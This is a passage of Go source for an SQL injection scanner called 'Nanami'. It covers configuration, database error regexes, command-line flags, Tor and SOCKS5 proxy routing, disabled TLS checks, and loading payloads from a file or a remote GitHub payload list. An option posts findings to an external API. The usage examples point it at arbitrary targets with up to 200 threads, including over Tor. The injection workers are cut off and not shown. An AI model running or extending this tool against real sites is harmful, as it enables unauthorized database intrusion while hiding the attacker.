const (
	version     = "1.0.0"
	userAgent   = "Nanami/1.0 (High-Intensity SQLi Scanner; made by nanami)"
	banner      = "Nanami SQLi Scanner %s - made by nanami\n"
	defaultThreads = 50
)

// Configuration holds all runtime settings
type Configuration struct {
	TargetURL     string
	Method        string
	PostData      string
	Headers       []string
	Cookies       string
	PayloadFile   string
	Threads       int
	InjectParam   string
	Timeout       time.Duration
	Retries       int
	Proxy         string
	TorProxy      bool
	FetchPayloads bool
	ReportAPI     string
	Verbose       bool
	OutputDir     string
}

// Result holds a discovered vulnerability
type Result struct {
	URL     string
	Param   string
	Payload string
	Error   string
}

// SQL error patterns (regex) for detection
var sqlErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_.*`),
	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*\Wpg_.*`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)Microsoft OLE DB.*SQL Server`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)System\.Data\.SqlClient\.SqlException`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)SQLite\.Exception`),
}

var (
	results     []Result
	resultsMu   sync.Mutex
	vulnCount   uint64
	requestCount uint64
	client      *http.Client
)

func main() {
	cfg := parseFlags()

	// Print banner
	fmt.Printf(banner, version)

	// Prepare output directory
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create output directory: %v\n", err)
		os.Exit(1)
	}

	// Setup HTTP client
	setupHTTPClient(cfg)

	// Load payloads
	payloads, err := loadPayloads(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error loading payloads: %v\n", err)
		os.Exit(1)
	}
	logInfo(cfg, fmt.Sprintf("Loaded %d payloads", len(payloads)))

	// Determine injection parameter
	param := determineParam(cfg)
	logInfo(cfg, fmt.Sprintf("Testing parameter: %s", param))

	// Create worker pool
	payloadChan := make(chan string, len(payloads))
	for _, p := range payloads {
		payloadChan <- p
	}
	close(payloadChan)

	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Progress reporter
	go progressReporter(ctx, cfg.Verbose)

	// Launch workers
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go worker(ctx, &wg, payloadChan, cfg, param)
	}

	wg.Wait()

	// Save results
	saveResults(cfg)

	// Report to API if enabled
	if cfg.ReportAPI != "" {
		reportToAPI(cfg)
	}

	logInfo(cfg, fmt.Sprintf("Scan completed. Vulnerabilities found: %d", vulnCount))
	fmt.Printf("\nResults saved to %s/vulnerable.txt\n", cfg.OutputDir)
}

func parseFlags() *Configuration {
	cfg := &Configuration{}

	flag.StringVar(&cfg.TargetURL, "u", "", "Target URL (required)")
	flag.StringVar(&cfg.Method, "m", "GET", "HTTP method (GET/POST)")
	flag.StringVar(&cfg.PostData, "d", "", "POST data (key=value&...)")
	flag.StringVar(&cfg.PayloadFile, "p", "payloads.txt", "File containing SQLi payloads")
	flag.IntVar(&cfg.Threads, "t", defaultThreads, "Number of concurrent threads")
	flag.StringVar(&cfg.InjectParam, "param", "", "Parameter to inject (auto-detect if empty)")
	flag.DurationVar(&cfg.Timeout, "timeout", 10*time.Second, "Request timeout")
	flag.IntVar(&cfg.Retries, "retries", 1, "Number of retries on failure")
	flag.StringVar(&cfg.Proxy, "proxy", "", "HTTP/SOCKS5 proxy (e.g., http://127.0.0.1:8080 or socks5://127.0.0.1:9050)")
	flag.BoolVar(&cfg.TorProxy, "tor", false, "Use Tor SOCKS5 proxy (127.0.0.1:9050)")
	flag.BoolVar(&cfg.FetchPayloads, "fetch-payloads", false, "Fetch payloads from remote API")
	flag.StringVar(&cfg.ReportAPI, "report-api", "", "API endpoint to send results (POST JSON)")
	flag.BoolVar(&cfg.Verbose, "v", false, "Verbose output")
	flag.StringVar(&cfg.OutputDir, "o", "nanami_out", "Output directory")
	flag.StringVar(&cfg.Cookies, "cookies", "", "Cookie header value")

	// Custom headers (can be repeated)
	var headers arrayFlags
	flag.Var(&headers, "H", "Extra header (e.g., 'X-Forwarded-For: 127.0.0.1')")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Nanami SQLi Scanner - made by nanami\n")
		fmt.Fprintf(os.Stderr, "Usage: %s -u <target_url> [options]\n\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" -t 100\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -u \"http://target.com/login\" -m POST -d \"user=admin&pass=123\" -p mypayloads.txt -t 200\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -u \"http://onion.site\" --tor -t 50\n", os.Args[0])
	}

	flag.Parse()

	if cfg.TargetURL == "" {
		flag.Usage()
		os.Exit(1)
	}

	cfg.Headers = headers

	// Add cookie header if provided
	if cfg.Cookies != "" {
		cfg.Headers = append(cfg.Headers, "Cookie: "+cfg.Cookies)
	}

	// Tor shortcut
	if cfg.TorProxy {
		cfg.Proxy = "socks5://127.0.0.1:9050"
	}

	return cfg
}

// arrayFlags allows multiple -H flags
type arrayFlags []string

func (i *arrayFlags) String() string {
	return strings.Join(*i, ", ")
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func setupHTTPClient(cfg *Configuration) {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        cfg.Threads * 2,
		MaxIdleConnsPerHost: cfg.Threads,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  true,
	}

	// Configure proxy if needed
	if cfg.Proxy != "" {
		proxyURL, err := url.Parse(cfg.Proxy)
		if err == nil {
			if proxyURL.Scheme == "socks5" {
				// Use golang.org/x/net/proxy for SOCKS5
				dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
				if err == nil {
					transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
						return dialer.(proxy.ContextDialer).DialContext(ctx, network, addr)
					}
				}
			} else {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	}

	client = &http.Client{
		Transport: transport,
		Timeout:   cfg.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects
		},
	}
}

func loadPayloads(cfg *Configuration) ([]string, error) {
	if cfg.FetchPayloads {
		payloads, err := fetchPayloadsFromAPI()
		if err == nil && len(payloads) > 0 {
			logInfo(cfg, fmt.Sprintf("Fetched %d payloads from API", len(payloads)))
			return payloads, nil
		}
		logInfo(cfg, "Failed to fetch payloads from API, falling back to file")
	}

	// Read from file
	file, err := os.Open(cfg.PayloadFile)
	if err != nil {
		// Generate default payloads if file not found
		if os.IsNotExist(err) {
			return generateDefaultPayloads(), nil
		}
		return nil, err
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	return payloads, scanner.Err()
}

func fetchPayloadsFromAPI() ([]string, error) {
	// Example API endpoint (replace with real one if needed)
	apiURL := "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit.txt"
	resp, err := http.Get(apiURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(body), "\n")
	var payloads []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	return payloads, nil
}

